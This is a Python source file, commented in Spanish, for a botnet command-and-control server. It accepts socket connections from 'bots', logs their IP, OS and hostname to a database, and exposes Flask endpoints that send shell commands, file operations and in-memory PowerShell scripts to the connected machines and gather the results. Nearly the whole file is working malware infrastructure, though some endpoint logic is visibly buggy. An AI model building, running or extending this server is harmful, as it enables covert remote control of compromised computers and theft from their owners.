from datetime import datetime
from flask import Flask, jsonify, request
import logging
import socket
import sys
import threading
import time
import os
import ipaddress
import sqlite3
import configparser

app = Flask(__name__)

# Variables globales
bots = []
bot_ids = {}
sistemas_operativos = {}
respuestas_bots = {}
server_running = True

def cargar_configuracion():
    """Carga la configuración del servidor."""
    config = configparser.ConfigParser()
    config.read(os.path.join(os.path.dirname(__file__), "..", "config", "config.ini"))
    return config

def configurar_logging(config):
    """Configura el sistema de logging."""
    log_path = os.path.join(os.path.dirname(__file__), "..", config.get("LOGGING", "LOG_DIR"), config.get("LOGGING", "SERVER_LOG_FILE"))
    os.makedirs(os.path.dirname(log_path), exist_ok=True)
    
    logging.basicConfig(
        level=logging.INFO,
        format="%(asctime)s - %(levelname)s - %(message)s",
        handlers=[
            logging.FileHandler(log_path, encoding="utf-8"),
            logging.StreamHandler()
        ]
    )

def aceptar_conexiones(server):
    """Acepta conexiones de bots."""
    global server_running
    bot_id = 1
    while server_running:
        try:
            conn, addr = server.accept()
            bots.append(conn)
            bot_ids[conn] = bot_id
            threading.Thread(target=manejar_bot, args=(conn, addr, bot_id)).start()
            bot_id += 1
        except socket.timeout:
            continue
        except Exception as e:
            if server_running:
                logging.error(f"Error aceptando conexión: {e}")

from modules.database_manager import DatabaseManager

# Inicializar el gestor de base de datos
db = DatabaseManager()  # Ya no pasamos la ruta, usará la predeterminada

def manejar_bot(conn, addr, bot_id):
    """Maneja la conexión con un bot."""
    try:
        # Esperar identificación del bot
        identificador = conn.recv(1024).decode("utf-8").strip()
        if not identificador:
            conn.close()
            return
            
        # Detectar sistema operativo
        conn.send("detect_os".encode("utf-8"))
        os_info = conn.recv(1024).decode("utf-8").strip().lower()
        sistema = "windows" if "windows" in os_info else "linux"
        
        # Registrar o actualizar bot en la base de datos
        db_bot_id = db.register_bot(
            unique_id=identificador,
            ip_address=addr[0],
            system_os=sistema,
            hostname=f"bot_{bot_id}",
            additional_info={
                "port": addr[1],
                "connection_time": datetime.now().isoformat()
            }
        )
        
        logging.info(f"Bot {bot_id} registrado en DB con ID {db_bot_id}")
        
        # Agregar a las estructuras en memoria
        sistemas_operativos[conn] = sistema
        bots.append(conn)
        bot_ids[conn] = bot_id
        
        # Procesar comandos pendientes
        pending_commands = db.get_pending_commands(db_bot_id)
        for cmd in pending_commands:
            try:
                conn.send(cmd['command'].encode("utf-8"))
                # Esperar respuesta
                response = conn.recv(4096).decode("utf-8", errors="ignore").strip()
                if response:
                    db.store_response(db_bot_id, cmd['command'], response)
                db.mark_command_executed(cmd['id'])
            except:
                continue
        
        # Bucle principal de comunicación
        while True:
            try:
                data = conn.recv(4096).decode("utf-8", errors="ignore").strip()
                if not data:
                    break
                    
                # Almacenar respuesta en la base de datos
                db.store_response(db_bot_id, "unknown", data)
                respuestas_bots[bot_id] = data
                
            except:
                break
                
    except Exception as e:
        logging.error(f"Error con bot {bot_id}: {e}")
    finally:
        # Marcar bot como inactivo en la base de datos
        try:
            db.mark_bot_inactive(db_bot_id)
        except:
            pass
            
        conn.close()
        if conn in bots:
            bots.remove(conn)
        if conn in bot_ids:
            del bot_ids[conn]
        if conn in sistemas_operativos:
            del sistemas_operativos[conn]

@app.route('/listar_bots', methods=['GET'])
def listar_bots():
    """Lista todos los bots conectados."""
    try:
        active_bots = db.get_active_bots()
        if active_bots:
            return jsonify([{
                "id": bot["id"],
                "unique_id": bot["unique_id"],
                "so": bot["system_os"].capitalize(),
                "ip": bot["ip_address"],
                "hostname": bot["hostname"],
                "last_seen": bot["last_seen"]
            } for bot in active_bots])
        return jsonify({"message": "No hay bots conectados."})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/enviar_comando', methods=['POST'])
def enviar_comando():
    """Envía comandos a los bots."""
    try:
        data = request.json
        if not bots:
            return jsonify({"message": "No hay bots conectados."})

        respuestas = {}
        for bot in bots:
            try:
                comando = data["comando_windows"] if sistemas_operativos[bot] == "windows" else data["comando_linux"]
                bot.send(comando.encode("utf-8"))
                bot_id = bot_ids[bot]
                
                # Esperar respuesta
                tiempo_inicio = time.time()
                while time.time() - tiempo_inicio < 5:
                    if bot_id in respuestas_bots:
                        respuestas[bot_id] = respuestas_bots.pop(bot_id)
                        break
                    time.sleep(0.1)
            except:
                continue

        return jsonify({"respuestas": respuestas})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/shutdown', methods=['POST'])
def shutdown():
    """Apaga el servidor y desconecta todos los bots."""
    global server_running
    try:
        server_running = False
        for bot in bots[:]:
            try:
                bot.send("shutdown".encode("utf-8"))
                bot.close()
            except:
                pass
        bots.clear()
        bot_ids.clear()
        sistemas_operativos.clear()
        respuestas_bots.clear()
        return jsonify({"message": "Servidor apagado correctamente"})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

from modules.basic_commands import *
from modules.file_operations import *
from modules.advanced_execution import *

# Nuevos endpoints después de los existentes
@app.route('/execute_command', methods=['POST'])
def execute_system_command_endpoint():
    """Ejecuta un comando del sistema en los bots seleccionados."""
    try:
        data = request.json
        command = data.get('command')
        bot_ids = data.get('bot_ids', [])
        
        respuestas = {}
        for bot in bots:
            if not bot_ids or bot_ids.get(bot) in bot_ids:
                try:
                    bot.send(f"cmd:{command}".encode("utf-8"))
                    bot_id = bot_ids[bot]
                    # Esperar respuesta
                    tiempo_inicio = time.time()
                    while time.time() - tiempo_inicio < 5:
                        if bot_id in respuestas_bots:
                            respuestas[bot_id] = respuestas_bots.pop(bot_id)
                            break
                        time.sleep(0.1)
                except:
                    continue
        return jsonify({"respuestas": respuestas})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/file_operations', methods=['POST'])
def file_operations_endpoint():
    """Maneja operaciones con archivos."""
    try:
        data = request.json
        operation = data.get('operation')
        path = data.get('path')
        file_data = data.get('file_data')
        bot_ids = data.get('bot_ids', [])
        
        respuestas = {}
        for bot in bots:
            if not bot_ids or bot_ids.get(bot) in bot_ids:
                try:
                    cmd = f"file:{operation}:{path}"
                    if file_data:
                        cmd += f":{file_data}"
                    bot.send(cmd.encode("utf-8"))
                    bot_id = bot_ids[bot]
                    # Esperar respuesta
                    tiempo_inicio = time.time()
                    while time.time() - tiempo_inicio < 5:
                        if bot_id in respuestas_bots:
                            respuestas[bot_id] = respuestas_bots.pop(bot_id)
                            break
                        time.sleep(0.1)
                except:
                    continue
        return jsonify({"respuestas": respuestas})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/execute_script', methods=['POST'])
def execute_script_endpoint():
    """Ejecuta scripts en memoria."""
    try:
        data = request.json
        script = data.get('script')
        script_type = data.get('type', 'powershell')
        bot_ids = data.get('bot_ids', [])
        
        respuestas = {}
        for bot in bots:
            if not bot_ids or bot_ids.get(bot) in bot_ids:
                try:
                    cmd = f"script:{script_type}:{script}"
                    bot.send(cmd.encode("utf-8"))
                    bot_id = bot_ids[bot]
                    # Esperar respuesta
                    tiempo_inicio = time.time()
                    while time.time() - tiempo_inicio < 5:
                        if bot_id in respuestas_bots:
                            respuestas[bot_id] = respuestas_bots.pop(bot_id)
                            break
                        time.sleep(0.1)
                except:
                    continue
        return jsonify({"respuestas": respuestas})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

def iniciar_servidor_cnc():
    """Inicia el servidor CnC."""
    global server_running
    try:
        config = cargar_configuracion()
        configurar_logging(config)
        
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        host = config.get("NETWORK", "HOST")
        port = config.getint("NETWORK", "PORT")  # Usando el puerto CnC
        server.bind((host, port))
        server.listen(5)
        server.settimeout(1)
        
        print(f"[+] Servidor CnC escuchando en {host}:{port}")
        
        def accept_wrapper():
            next_bot_id = 1
            while server_running:
                try:
                    conn, addr = server.accept()
                    threading.Thread(target=manejar_bot, args=(conn, addr, next_bot_id)).start()
                    next_bot_id += 1
                except socket.timeout:
                    continue
                except Exception as e:
                    if server_running:
                        logging.error(f"Error aceptando conexión: {e}")
        
        threading.Thread(target=accept_wrapper, daemon=True).start()
        return True
        
    except Exception as e:
        logging.error(f"Error iniciando servidor CnC: {e}")
        return False

if __name__ == "__main__":
    try:
        print("[*] Iniciando servidor C&C...")
        if iniciar_servidor_cnc():
            print("[+] Servidor C&C iniciado correctamente")
            print("[*] Iniciando servidor web...")
            api_port = cargar_configuracion().getint("NETWORK", "API_PORT")
            print("[*] Servidor web escuchando en http://127.0.0.1:5000")
            # Silenciar los mensajes de desarrollo de Flask
            import logging
            log = logging.getLogger('werkzeug')
            log.setLevel(logging.ERROR)
            # Iniciar Flask sin mensajes de desarrollo
            app.run(host="127.0.0.1", port=api_port, debug=False, use_reloader=False)
        else:
            print("[-] Error al iniciar el servidor C&C")
            sys.exit(1)
    except Exception as e:
        print(f"[-] Error crítico: {e}")
        sys.exit(1)
